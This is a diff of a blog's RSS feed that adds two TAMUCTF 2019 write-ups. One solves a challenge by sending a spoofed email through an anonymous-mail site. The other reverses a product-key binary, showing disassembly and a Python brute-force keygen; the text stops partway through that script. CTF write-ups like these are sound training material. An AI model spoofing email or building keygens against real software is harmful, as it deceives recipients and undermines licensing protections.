-&lt;p&gt;&lt;img src=&quot;/img/jekyll/1/code2.png&quot; alt=&quot;code example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/1/code2.png&quot; alt=&quot;code example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Hope you guys enjoyed it!&lt;/p&gt;
 
@@ -102,9 +304,449 @@ This was a standard stack execution where we had to insert our shellcode in the 
         
         <category>CTF</category>
         
+        <category>|</category>
+        
         <category>RATF</category>
         
+        <category>|</category>
+        
         <category>FLAG</category>
+        
+        <category>|</category>
+        
+        <category>CHALLENGE</category>
+        
+        
+        <category>challenge</category>
+        
+      </item>
+    
+      <item>
+        <title>TAMUCTF2019 Onboarding Checklist Write-up</title>
+        <description>&lt;p&gt;Hey guys, This is how I solved the Onboading Checklist Challenge from TamuCTF 2019.&lt;/p&gt;
+
+&lt;p&gt;This kind of challenge you don’t see everyday so it was a lot of fun and really simple.&lt;/p&gt;
+
+&lt;p&gt;Let’s GO!&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/1/ratf.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/3/code.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The Challenge presents itself with this message. Apparently “importantperson” has allowed “someguy” to ask for new account request for the new employees and asked “someguy” to send an e-mail to tamuctf@gmail.com with the new employee’s e-mail address.
+So, all we have to do is send a spoofed email to tamuctf@gmail pretending to “someguy” with our e-mail address.&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/3/addr.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I used this &lt;a href=&quot;http://www.sendanonymousemail.net/&quot;&gt;Website&lt;/a&gt; to do it.&lt;/p&gt;
+
+&lt;p&gt;And a few hours later we get our response back.&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/3/code1.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Hope you guys enjoyed it!&lt;/p&gt;
+
+&lt;p&gt;by me&lt;/p&gt;
+</description>
+        <pubDate>Fri, 03 May 2019 00:00:00 -0300</pubDate>
+        <link>http://localhost:4000/tamuctf2019-onboarding-checklist-write-up/</link>
+        <guid isPermaLink="true">http://localhost:4000/tamuctf2019-onboarding-checklist-write-up/</guid>
+        
+        <category>CTF</category>
+        
+        <category>|</category>
+        
+        <category>RATF</category>
+        
+        <category>|</category>
+        
+        <category>FLAG</category>
+        
+        <category>|</category>
+        
+        <category>CHALLENGE</category>
+        
+        
+        <category>challenge</category>
+        
+      </item>
+    
+      <item>
+        <title>TAMUCTF2019 Keygenme — Write-up</title>
+        <description>&lt;p&gt;Hello everybody! This is how I solved one of the many reversing problems at TAMUCTF 2019.&lt;/p&gt;
+
+&lt;p&gt;This one was Keygenme, a pretty standard kind of challenge but yet very fun to solve it.&lt;/p&gt;
+
+&lt;p&gt;Let’s go!&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/1/ratf.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/4/code.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Let’s start by running the binary that was given to us and see what it says.&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/4/code1.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Basically, when we run the binary it asks for a product key and if we give an incorrect one it simply shuts itself down. Then I searched for the strings inside the binary, sometimes they help us understand what the program is doing.&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/4/code2.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;By using rabin2 I was able to identify all the strings in the binary, all of them are very important so let’s take a look at them one by one&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;	[OIonU2_&amp;lt;__nK&amp;lt;KsK&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;A pretty odd string that at the start don’t get our attention as the others, but it’s gonna be important in a moment.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;\nPlease Enter a product key to continue:&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;That’s the string we just saw.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;flag.txt&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;A string that everybody likes to see, but I don’t have a flag.txt? Do you?&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;Too bad the flag is only on the remote server!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;String, even if we bypassed the checking functions using the disassembler locally we would not be able to retrieve our flag because it’s been hosted remotely.&lt;/p&gt;
+
+&lt;p&gt;So with this quick overview of the strings, we now know that we have to create our own keygen to beat this challenge.&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/4/code3.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Analyzing the binary with hopper disassembler there are 3 functions that get our attention&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;0x92a P enc
+0x9da P verify_key
+0xa46 P main&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;It’s pretty clear what each function is doing so I’m gonna skip that whole explanation and focus on the verify_key function first.&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/4/code4.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;That part is at the beginning of the function verify_key and its job is to get our input, our “KEY”, and checks if its size is bigger than 0x9 in hexa aka 9 in decimal xd.&lt;/p&gt;
+
+&lt;p&gt;So, important information, we must supply a key that is longer than 9 digits, noted.&lt;/p&gt;
+
+&lt;p&gt;Right after this block, there’s a check to see if our input is larger than 0x40 bytes, since we will no be providing a key this long, I’m gonna skip it.&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/4/code5.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;There are a few import things we must consider on this part of the function.&lt;/p&gt;
+
+&lt;ol&gt;
+	&lt;li&gt;The enc function is called by verify_key and not by main.&lt;/li&gt;
+	&lt;li&gt;Right after enc function is called our modified key is compared to [OIonU2_&amp;lt;__nK&amp;lt;KsK
+	&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Now it’s clear that we have to provide some input that after it passes the enc function it has to be equal to that strange string we saw early on.&lt;/p&gt;
+
+&lt;p&gt;Now we have to go through the enc function and figure what it is doing with our input and reverse it.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;0000000000000960         mov        eax, dword [rbp+var_10]    ; CODE XREF=enc+168
+0000000000000963         movsxd     rdx, eax
+0000000000000966         mov        rax, qword [rbp+var_28]
+000000000000096a         add        rax, rdx
+000000000000096d         movzx      eax, byte [rax]
+0000000000000970         movsx      eax, al
+0000000000000973         lea        edx, dword [rax+0xc]
+0000000000000976         movzx      eax, byte [rbp+var_11]
+000000000000097a         imul       eax, edx
+000000000000097d         lea        ecx, dword [rax+0x11]
+0000000000000980         mov        edx, 0xea0ea0eb
+0000000000000985         mov        eax, ecx
+0000000000000987         imul       edx
+0000000000000989         lea        eax, dword [rdx+rcx]
+000000000000098c         sar        eax, 0x6
+000000000000098f         mov        edx, eax
+0000000000000991         mov        eax, ecx
+0000000000000993         sar        eax, 0x1f
+0000000000000996         sub        edx, eax
+0000000000000998         mov        eax, edx
+000000000000099a         imul       eax, eax, 0x46
+000000000000099d         sub        ecx, eax
+000000000000099f         mov        eax, ecx
+00000000000009a1         lea        ecx, dword [rax+0x30]
+00000000000009a4         mov        eax, dword [rbp+var_10]
+00000000000009a7         movsxd     rdx, eax
+00000000000009aa         mov        rax, qword [rbp+var_8]
+00000000000009ae         add        rax, rdx
+00000000000009b1         mov        edx, ecx
+00000000000009b3         mov        byte [rax], dl
+00000000000009b5         mov        eax, dword [rbp+var_10]
+00000000000009b8         movsxd     rdx, eax
+00000000000009bb         mov        rax, qword [rbp+var_8]
+00000000000009bf         add        rax, rdx
+00000000000009c2         movzx      eax, byte [rax]
+00000000000009c5         mov        byte [rbp+var_11], al
+00000000000009c8         add        dword [rbp+var_10], 0x1
+loc_9cc:
+00000000000009cc         mov        eax, dword [rbp+var_10]         ; CODE XREF=enc+52
+00000000000009cf         cmp        eax, dword [rbp+var_C]
+00000000000009d2         jl         loc_960&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;using this part and the hopper pseudo code:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;enc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;arg0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;var_28&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;arg0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;var_8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;var_C&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;var_28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;var_11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;var_10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;var_10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;var_C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;var_10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;var_10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;rcx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;var_11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sign_extend_64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int8_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;var_28&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sign_extend_64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;var_10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int8_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;var_8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sign_extend_64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;var_10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rcx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SAR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HIDWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rcx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffffffffea0ea0eb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SAR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x46&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;var_11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int8_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;var_8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sign_extend_64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;var_10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;var_8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;I managed to write this whole process in python and I noticed that the next key’s value always depends on its previous neighbor. So to discover what key generates this [OIonU2_&amp;lt;__nK&amp;lt;KsK, I simply brute forced it XD.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python 
+&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;enckeyFINAL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[OIonU2_&amp;lt;__nK&amp;lt;KsK&quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#G&amp;gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x48&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;flagfinal&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;flag2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;cont&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;chars&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;amp;'()*+,-./0123456789:;&amp;lt;=&amp;gt;?@[]^_`{|}~'&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;		
+		&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chars&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)):&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;rcx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chars&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x11&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xffffffffea0ea0eb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rcx&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:],&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rcx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1f&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x46&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rcx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;flag2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;enckeyFINAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cont&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;
